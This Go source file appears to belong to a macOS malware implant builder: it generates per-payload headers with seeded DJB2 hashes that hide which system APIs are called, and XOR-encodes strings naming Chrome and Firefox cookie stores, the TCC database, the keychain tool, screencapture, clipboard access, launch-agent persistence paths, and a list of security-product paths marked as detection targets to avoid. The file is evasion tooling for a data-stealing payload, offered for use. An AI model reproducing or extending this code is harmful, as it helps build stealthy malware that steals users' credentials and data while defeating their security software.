package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"strings"
)

// cryptoRandUint32 returns a cryptographically random uint32.
func cryptoRandUint32() uint32 {
	var buf [4]byte
	_, _ = rand.Read(buf[:])
	return binary.LittleEndian.Uint32(buf[:])
}

// djb2Hash computes a case-insensitive DJB2 hash (same as beacon's djb2a).
// Must match the C implementation in dyld_resolve.c exactly.
func djb2Hash(seed uint32, s string) uint32 {
	h := seed
	for _, c := range strings.ToLower(s) {
		h = ((h << 5) + h) + uint32(c)
	}
	return h
}

// macOS dylib entries — the libraries whose APIs we resolve by hash
var macosLibs = []struct {
	define  string
	libName string
}{
	{"HASH_LIB_LIBSYSTEM", "libSystem.B.dylib"},
	{"HASH_LIB_LIBSYSTEM_C", "libsystem_c.dylib"},
	{"HASH_LIB_LIBSYSTEM_KERNEL", "libsystem_kernel.dylib"},
	{"HASH_LIB_LIBSYSTEM_PTHREAD", "libsystem_pthread.dylib"},
	{"HASH_LIB_COREFOUNDATION", "CoreFoundation"},
	{"HASH_LIB_SECURITY", "Security"},
	{"HASH_LIB_COREGRAPHICS", "CoreGraphics"},
}

// macOS function entries — organized by category
var macosFuncSections = []struct {
	comment string
	funcs   []struct {
		define string
		name   string
	}
}{
	{
		"// ── File I/O ──",
		[]struct{ define, name string }{
			{"HASH_FUNC_OPEN", "open"},
			{"HASH_FUNC_CLOSE", "close"},
			{"HASH_FUNC_READ", "read"},
			{"HASH_FUNC_WRITE", "write"},
			{"HASH_FUNC_STAT", "stat"},
			{"HASH_FUNC_FSTAT", "fstat"},
			{"HASH_FUNC_UNLINK", "unlink"},
			{"HASH_FUNC_RENAME", "rename"},
			{"HASH_FUNC_MKDIR", "mkdir"},
			{"HASH_FUNC_OPENDIR", "opendir"},
			{"HASH_FUNC_READDIR", "readdir"},
			{"HASH_FUNC_CLOSEDIR", "closedir"},
			{"HASH_FUNC_GETCWD", "getcwd"},
			{"HASH_FUNC_CHDIR", "chdir"},
			{"HASH_FUNC_COPYFILE", "copyfile"},
			{"HASH_FUNC_RMDIR", "rmdir"},
			{"HASH_FUNC_REWINDDIR", "rewinddir"},
		},
	},
	{
		"// ── Memory ──",
		[]struct{ define, name string }{
			{"HASH_FUNC_MMAP", "mmap"},
			{"HASH_FUNC_MUNMAP", "munmap"},
			{"HASH_FUNC_MPROTECT", "mprotect"},
		},
	},
	{
		"// ── Process ──",
		[]struct{ define, name string }{
			{"HASH_FUNC_FORK", "fork"},
			{"HASH_FUNC_EXECVE", "execve"},
			{"HASH_FUNC_EXECVP", "execvp"},
			{"HASH_FUNC_EXECL", "execl"},
			{"HASH_FUNC_EXECLP", "execlp"},
			{"HASH_FUNC_WAITPID", "waitpid"},
			{"HASH_FUNC_GETPID", "getpid"},
			{"HASH_FUNC_GETUID", "getuid"},
			{"HASH_FUNC_GETEUID", "geteuid"},
			{"HASH_FUNC_KILL", "kill"},
			{"HASH_FUNC_KILLPG", "killpg"},
			{"HASH_FUNC_SETSID", "setsid"},
			{"HASH_FUNC_SETPGID", "setpgid"},
			{"HASH_FUNC_EXIT", "_exit"},
		},
	},
	{
		"// ── Network ──",
		[]struct{ define, name string }{
			{"HASH_FUNC_SOCKET", "socket"},
			{"HASH_FUNC_CONNECT", "connect"},
			{"HASH_FUNC_GETADDRINFO", "getaddrinfo"},
			{"HASH_FUNC_FREEADDRINFO", "freeaddrinfo"},
			{"HASH_FUNC_GETHOSTNAME", "gethostname"},
			{"HASH_FUNC_GETSOCKOPT", "getsockopt"},
			{"HASH_FUNC_SETSOCKOPT", "setsockopt"},
			{"HASH_FUNC_SELECT", "select"},
		},
	},
	{
		"// ── System ──",
		[]struct{ define, name string }{
			{"HASH_FUNC_SYSCTL", "sysctl"},
			{"HASH_FUNC_SYSCTLBYNAME", "sysctlbyname"},
			{"HASH_FUNC_GETENV", "getenv"},
			{"HASH_FUNC_SETENV", "setenv"},
			{"HASH_FUNC_SLEEP", "sleep"},
			{"HASH_FUNC_USLEEP", "usleep"},
		},
	},
	{
		"// ── Pipes & PTY ──",
		[]struct{ define, name string }{
			{"HASH_FUNC_PIPE", "pipe"},
			{"HASH_FUNC_DUP2", "dup2"},
			{"HASH_FUNC_FCNTL", "fcntl"},
			{"HASH_FUNC_POSIX_OPENPT", "posix_openpt"},
			{"HASH_FUNC_GRANTPT", "grantpt"},
			{"HASH_FUNC_UNLOCKPT", "unlockpt"},
			{"HASH_FUNC_PTSNAME", "ptsname"},
			{"HASH_FUNC_IOCTL", "ioctl"},
		},
	},
	{
		"// ── Threading ──",
		[]struct{ define, name string }{
			{"HASH_FUNC_PTHREAD_CREATE", "pthread_create"},
			{"HASH_FUNC_PTHREAD_DETACH", "pthread_detach"},
			{"HASH_FUNC_PTHREAD_MUTEX_INIT", "pthread_mutex_init"},
			{"HASH_FUNC_PTHREAD_MUTEX_LOCK", "pthread_mutex_lock"},
			{"HASH_FUNC_PTHREAD_MUTEX_UNLOCK", "pthread_mutex_unlock"},
		},
	},
	{
		"// ── Crypto/Random ──",
		[]struct{ define, name string }{
			{"HASH_FUNC_ARC4RANDOM_BUF", "arc4random_buf"},
		},
	},
	{
		"// ── String/Misc ──",
		[]struct{ define, name string }{
			{"HASH_FUNC_DLOPEN", "dlopen"},
			{"HASH_FUNC_DLSYM", "dlsym"},
			{"HASH_FUNC_DLCLOSE", "dlclose"},
		},
	},
	{
		"// ── macOS-specific ──",
		[]struct{ define, name string }{
			{"HASH_FUNC_GETPWUID", "getpwuid"},
			{"HASH_FUNC_GETGRGID", "getgrgid"},
			{"HASH_FUNC_GETIFADDRS", "getifaddrs"},
			{"HASH_FUNC_FREEIFADDRS", "freeifaddrs"},
			{"HASH_FUNC_INET_NTOP", "inet_ntop"},
			{"HASH_FUNC_LOCALTIME", "localtime"},
			{"HASH_FUNC_STRFTIME", "strftime"},
			{"HASH_FUNC_GETSOCKOPT", "getsockopt"},
			{"HASH_FUNC_SETSOCKOPT", "setsockopt"},
		},
	},
}

// Sensitive strings that should be XOR-encoded per-payload
var obfuscatedStrings = []struct {
	define string
	value  string
}{
	{"OBF_SCREENCAPTURE", "/usr/sbin/screencapture"},
	{"OBF_PBPASTE", "/usr/bin/pbpaste"},
	{"OBF_LAUNCHCTL", "/bin/launchctl"},
	{"OBF_SECURITY_BIN", "/usr/bin/security"},
	{"OBF_DEFAULTS", "/usr/bin/defaults"},
	{"OBF_SQLITE3", "/usr/bin/sqlite3"},
	{"OBF_PS", "/bin/ps"},
	{"OBF_RM", "/bin/rm"},
	{"OBF_DITTO", "/usr/bin/ditto"},
	{"OBF_SH", "/bin/sh"},
	{"OBF_BASH", "/bin/bash"},
	{"OBF_ZSH", "/bin/zsh"},
	{"OBF_DEV_URANDOM", "/dev/urandom"},
	{"OBF_TCC_DB", "/Library/Application Support/com.apple.TCC/TCC.db"},
	{"OBF_CHROME_COOKIES", "Library/Application Support/Google/Chrome/Default/Cookies"},
	{"OBF_FIREFOX_COOKIES", "Library/Application Support/Firefox/Profiles"},
	{"OBF_LAUNCH_AGENTS", "Library/LaunchAgents"},
	{"OBF_LAUNCH_DAEMONS", "/Library/LaunchDaemons"},
	{"OBF_LS", "/bin/ls"},
	{"OBF_TMP", "/tmp"},
	{"OBF_SYSVER_PLIST", "/System/Library/CoreServices/SystemVersion.plist"},
	{"OBF_CHROME_DEFAULT", "Library/Application Support/Google/Chrome/Default/"},

	// EDR product paths — critical YARA targets
	{"OBF_EDR_CS_FALCONCTL", "/Library/CS/falconctl"},
	{"OBF_EDR_CS_FALCON", "/Library/Application Support/com.crowdstrike.falcon"},
	{"OBF_EDR_ADDIGY", "/Library/Addigy/auditor"},
	{"OBF_EDR_MALWAREBYTES", "/Library/Application Support/Malwarebytes"},
	{"OBF_EDR_JAMF", "/Library/Application Support/JAMF"},
	{"OBF_EDR_S1_APP", "/Applications/SentinelOne/SentinelAgent.app"},
	{"OBF_EDR_S1_LIB", "/Library/Sentinel/sentinel-agent.bundle"},
	{"OBF_EDR_ES_KEXT", "/Library/Extensions/EndpointSecurity.kext"},
	{"OBF_EDR_SOPHOS", "/Library/Application Support/Sophos"},
	{"OBF_EDR_ELASTIC", "/Library/Application Support/com.elastic.endpoint"},
	{"OBF_EDR_BLOCKBLOCK", "/Applications/BlockBlock Helper.app"},
	{"OBF_EDR_LULU", "/Applications/LuLu.app"},
	{"OBF_EDR_KNOCKKNOCK", "/Applications/KnockKnock.app"},
	{"OBF_EDR_REIKEY", "/Applications/ReiKey.app"},
	{"OBF_EDR_XPROTECT", "/Library/Apple/System/Library/Extensions/AppleHV.kext"},
}

// generateObfStrings generates a strings_obf.h with XOR-encoded sensitive strings.
func generateObfStrings() string {
	key := make([]byte, 16)
	_, _ = rand.Read(key)

	var b strings.Builder
	b.WriteString("#pragma once\n\n")
	b.WriteString("// Auto-generated — per-payload XOR-obfuscated strings\n\n")
	b.WriteString("#include <stdint.h>\n\n")

	// Write XOR key defines
	for i := 0; i < 16; i++ {
		b.WriteString(fmt.Sprintf("#define XOR_KEY_%d  0x%02x\n", i, key[i]))
	}
	b.WriteString("\n")

	// XOR key array
	b.WriteString("static const uint8_t _xor_key[16] = {\n    ")
	for i := 0; i < 16; i++ {
		b.WriteString(fmt.Sprintf("XOR_KEY_%d", i))
		if i < 15 {
			b.WriteString(", ")
		}
		if i == 7 {
			b.WriteString("\n    ")
		}
	}
	b.WriteString("\n};\n\n")

	// xor_decode function + macros
	b.WriteString(`static inline void xor_decode(char* buf, const uint8_t* enc, int len) {
    for (int i = 0; i < len; i++) {
        buf[i] = (char)(enc[i] ^ _xor_key[i % 16]);
    }
    buf[len] = '\0';
}

#define DEOBF(var_name, obf_array) \
    char var_name[sizeof(obf_array)]; \
    xor_decode(var_name, obf_array, sizeof(obf_array) - 1)

#define ZERO_STR(var_name, obf_array) do { \
    volatile char* _p = (volatile char*)(var_name); \
    for (unsigned _i = 0; _i < sizeof(obf_array); _i++) _p[_i] = 0; \
} while(0)

`)

	for _, entry := range obfuscatedStrings {
		data := []byte(entry.value)
		b.WriteString(fmt.Sprintf("// \"%s\" (%d bytes)\n", entry.value, len(data)))
		b.WriteString(fmt.Sprintf("static const uint8_t %s[] = {\n    ", entry.define))
		for i, ch := range data {
			enc := ch ^ key[i%16]
			if i > 0 && i%12 == 0 {
				b.WriteString("\n    ")
			}
			b.WriteString(fmt.Sprintf("0x%02x", enc))
			if i < len(data)-1 {
				b.WriteString(", ")
			}
		}
		// XOR'd null terminator
		nullEnc := byte(0) ^ key[len(data)%16]
		b.WriteString(fmt.Sprintf(", 0x%02x", nullEnc))
		b.WriteString("\n};\n\n")
	}

	return b.String()
}

// generateMacosApiDefines generates the ApiDefines.h content for macOS
// with DJB2 hashes computed using the given random seed.
func generateMacosApiDefines(seed uint32) string {
	var b strings.Builder
	b.WriteString("#pragma once\n\n")
	b.WriteString("// Auto-generated — per-payload DJB2 hashes\n")
	b.WriteString(fmt.Sprintf("// Seed: 0x%08x\n\n", seed))

	// Library hashes
	b.WriteString("// ── Library hashes (dylib basenames) ──\n")
	for _, lib := range macosLibs {
		h := djb2Hash(seed, lib.libName)
		pad := 40 - len(lib.define)
		if pad < 1 {
			pad = 1
		}
		b.WriteString(fmt.Sprintf("#define %s%s0x%xU\n", lib.define, strings.Repeat(" ", pad), h))
	}
	b.WriteString("\n")

	// Function hashes
	for _, section := range macosFuncSections {
		b.WriteString(section.comment + "\n")
		for _, entry := range section.funcs {
			h := djb2Hash(seed, entry.name)
			pad := 40 - len(entry.define)
			if pad < 1 {
				pad = 1
			}
			b.WriteString(fmt.Sprintf("#define %s%s0x%xU\n", entry.define, strings.Repeat(" ", pad), h))
		}
		b.WriteString("\n")
	}

	return b.String()
}
